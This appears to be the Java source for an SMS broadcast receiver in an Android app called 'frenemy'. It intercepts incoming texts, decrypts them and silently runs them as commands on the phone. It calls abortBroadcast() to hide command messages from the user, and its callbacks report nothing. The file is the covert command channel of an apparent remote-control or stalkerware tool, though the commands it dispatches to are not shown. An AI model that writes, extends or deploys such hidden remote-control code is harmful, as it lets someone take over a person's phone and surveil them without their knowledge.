package com.theah64.frenemy.android.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.SmsMessage;
import android.util.Log;

import com.theah64.frenemy.android.commandcenter.CommandFactory;
import com.theah64.frenemy.android.commandcenter.commands.BaseCommand;
import com.theah64.frenemy.android.utils.DarKnight;

import org.apache.commons.cli.ParseException;

import java.io.IOException;

public class SMSReceiver extends BroadcastReceiver {

    private static final String X = SMSReceiver.class.getSimpleName();

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(X, "SMS Received");

        final Object[] pdus = (Object[]) intent.getExtras().get("pdus");

        Log.d(X, "Decoding SMS");

        if (pdus != null) {

            Log.d(X, "Active PDUS");

            final StringBuilder msgBuilder = new StringBuilder();

            String from = null;
            //Looping through each pdus
            for (final Object pdu : pdus) {

                Log.d(X, "Looping trough pdu : " + pdu);

                final SmsMessage sms;

                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    String format = intent.getExtras().getString("format");
                    sms = SmsMessage.createFromPdu((byte[]) pdu, format);
                } else {
                    sms = SmsMessage.createFromPdu((byte[]) pdu);
                }

                msgBuilder.append(sms.getMessageBody());
                if (from == null) {
                    from = sms.getOriginatingAddress();
                }
            }

            final String encMsg = msgBuilder.toString();

            System.out.println("Full message: " + msgBuilder.toString());
            System.out.println("From: " + from);
            System.out.println("ENC Message: " + encMsg);

            final String decMsg = DarKnight.getDecrypted(encMsg);

            if (decMsg != null) {
                System.out.println("DEC Message: " + decMsg);
                abortBroadcast();

                try {
                    CommandFactory.getCommand(decMsg).handle(context, new BaseCommand.Callback() {
                        @Override
                        public void onError(String message) {

                        }

                        @Override
                        public void onInfo(String message) {

                        }

                        @Override
                        public void onSuccess(String message) {

                        }

                        @Override
                        public void onFinish(String message) {

                        }
                    });

                } catch (BaseCommand.CommandException | ParseException | BaseCommand.CommandHelp | IOException e) {
                    e.printStackTrace();
                }

            } else {
                Log.d(X, "It's not a frenemy command");
            }

        }
    }

}
